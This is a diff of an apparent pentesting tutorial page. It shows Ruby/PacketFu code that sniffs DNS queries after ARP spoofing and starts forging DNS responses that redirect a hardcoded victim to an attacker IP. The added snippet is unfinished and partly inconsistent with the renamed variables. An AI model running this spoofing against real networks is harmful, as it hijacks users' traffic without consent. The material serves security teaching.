@@ -116,8 +116,8 @@ def readable(raw_domain)
   while length_offset != 0
     fqdn << domain_name + "."
     length_offset = raw_domain[full_length].ord
-    domain_name   = raw_domain[full_length + 1 .. full_length + length_offset]
-    full_length   = raw_domain[0 .. full_length + length_offset].length
+    domain_name   = raw_domain[full_length + 1..full_length + length_offset]
+    full_length   = raw_domain[0..full_length + length_offset].length
   end
 
   return fqdn.chomp!('.')
@@ -131,14 +131,14 @@ end
 capture.stream.each do |pkt|
   # Make sure we can parse the packet; if we can, parse it
   if UDPPacket.can_parse?(pkt)
-    packet = Packet.parse(pkt)
+    @packet = Packet.parse(pkt)
 
     # Make sure we have a query packet
-    dns_query = packet.payload[2..3].to_s
+    dns_query = @packet.payload[2..3].to_s
 
     if dns_query == "\x01\x00"
       # Get the domain name into a readable format
-      domain_name = packet.payload[12..-1].to_s # FULL QUERY
+      domain_name = @packet.payload[12..-1].to_s # FULL QUERY
       fqdn = readable(domain_name)
 
       # Ignore non query packet
@@ -149,14 +149,41 @@ capture.stream.each do |pkt|
   end
 end
 ```
-Till now we successfully finished [ARP Spoofing](module_0x3__network_kungfu/arp_spoofing.md) then DNS cupturing but still we need to replace the requested domain with our domain. eg. attacker.zone
+Till now we successfully finished [ARP Spoofing](module_0x3__network_kungfu/arp_spoofing.md) then DNS cupturing but still we need to replace/spoof the original response to our domain. eg. attacker.zone
+Great, now we have to build a DNS response instead of spoofed to be sent. So what we need?
+
+* taking the IP we are going to redirect the user to (the spoofing_ip)
+    * converting it into hex using the to_i and pack functions.
+* From there we create a new UDP packet using the data contained in @ourInfo (IP and MAC) and fill in the normal UDP fields.
+    * I take most of this information straight from the DNS Query packet.
+* The next step is to create the DNS Response.
+    * he best way to understand the code here is to look at a DNS header and then
+    * take the bit map of the HEX values and apply them to the header.
+    * This will let you see what flags are being set.
+* From here, we just calculate the checksum for the UDP packet and send it out to the target’s machine.
+
+
+
+```ruby
+
+spoofing_ip = "69.171.234.21"
+spoofing_ip.split('.').map {|octet| octet.to_i}.pack('c*')
+
+  response = UDPPacket.new(:config => PacketFu::Utils.ifconfig("wlan0"))
+  response.udp_src   = packet.udp_dst
+  response.udp_dst   = packet.udp_src
+  response.ip_saddr  = packet.ip_daddr
+  response.ip_daddr  = "192.168.0.21"
+  response.eth_daddr = "00:0C:29:38:1D:61"
+
+
+```
+
 
 
 https://github.com/SilverFoxx/Spoofa/blob/master/spoofa
 
-
-
-Sources[^1] [^2] - The code has been modified and fixed for simplicty
+Sources[^1] [^2] - The code has been modified and fixed
 
 <br><br><br>
 ---
